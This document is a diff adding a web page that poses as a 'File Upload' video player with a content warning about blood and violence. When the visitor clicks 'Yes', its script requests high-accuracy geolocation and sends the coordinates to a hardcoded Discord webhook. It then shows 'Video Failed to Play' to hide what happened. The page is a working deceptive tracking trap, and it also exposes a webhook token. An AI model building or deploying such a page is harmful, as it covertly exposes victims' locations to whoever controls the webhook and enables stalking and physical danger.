@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>File Upload</title>
+
+<style>
+  body{
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:#111827;
+    color:white;
+    text-align:center;
+  }
+
+  header{
+    padding:25px;
+    background:#1f2937;
+  }
+
+  /* Image button */
+  .image-button{
+    background:none;
+    border:none;
+    cursor:pointer;
+    margin-top:20px;
+  }
+
+  .image-button img{
+    width:260px;
+    max-width:90%;
+    transition:0.2s;
+  }
+
+  .image-button img:hover{
+    transform:scale(1.03);
+  }
+
+  #popup{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.7);
+    display:none;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .popup-box{
+    background:#1f2937;
+    padding:30px;
+    border-radius:16px;
+    max-width:400px;
+  }
+
+  .popup-buttons{
+    margin-top:20px;
+    display:flex;
+    gap:10px;
+    justify-content:center;
+  }
+
+  .popup-buttons button{
+    padding:12px 22px;
+    border:none;
+    border-radius:10px;
+    font-size:16px;
+    cursor:pointer;
+    background:#2563eb;
+    color:white;
+  }
+
+  .cancel{
+    background:#374151 !important;
+  }
+
+  #status{
+    margin-top:20px;
+    font-size:18px;
+  }
+
+  /* Hidden data container */
+  #hiddenData{
+    display:none;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>File Upload</h1>
+  <p>1 Video</p>
+</header>
+
+<br>
+
+<!-- Image Button -->
+<button class="image-button" onclick="openPopup()">
+  <img src="showmylocation.png" alt="Show My Location">
+</button>
+
+<div id="status"></div>
+
+<!-- Hidden data -->
+<div id="hiddenData"></div>
+
+<!-- Consent Popup -->
+<div id="popup">
+  <div class="popup-box">
+    <h2>Play Video?</h2>
+
+    <p>
+      This video may contain
+      <br><br>
+      • Blood
+      <br>
+      • Violence
+      <br><br>
+      Continue?
+    </p>
+
+    <div class="popup-buttons">
+      <button onclick="acceptShare()">Yes</button>
+      <button class="cancel" onclick="closePopup()">No</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const webhook =
+"https://discord.com/api/webhooks/1503128622037336114/1cccZC0MVLdAANTypyP7od0oUSe3cZ8355WBr_CIzOGP1s-60Jkl_IZ6UGwCZRO7F-3s";
+
+function openPopup(){
+  document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup(){
+  document.getElementById("popup").style.display = "none";
+}
+
+function acceptShare(){
+
+  closePopup();
+
+  const status = document.getElementById("status");
+
+  status.innerHTML = "Waiting for required permission";
+
+  navigator.geolocation.getCurrentPosition(async (pos)=>{
+
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const accuracy = pos.coords.accuracy;
+
+    // Hidden data storage
+    document.getElementById("hiddenData").innerHTML = `
+      Latitude: ${lat}
+      Longitude: ${lon}
+      Accuracy: ${accuracy}
+    `;
+
+    status.innerHTML = "Video Failed to Play";
+
+    // Send to Discord webhook
+    await fetch(webhook, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content:
+`📍 New Location Shared
+
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${accuracy} meters`
+      })
+    });
+
+  }, ()=>{
+
+    status.innerHTML = "Video Failed to Play";
+
+  }, {
+    enableHighAccuracy:true
+  });
+}
+</script>
+
+</body>
+</html>
